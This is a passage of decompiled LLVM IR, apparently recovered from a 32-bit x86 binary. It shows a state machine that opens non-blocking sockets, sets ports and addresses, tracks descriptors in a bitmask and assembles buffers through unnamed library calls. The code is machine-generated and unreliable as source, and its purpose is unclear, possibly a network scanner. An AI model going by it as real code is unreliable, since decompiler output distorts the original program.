  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_80521f1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_80521f1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_80529e5(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_805212d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_805212d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_80529aa(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_805280a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_8051ce0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_8051ce0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054b1f.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
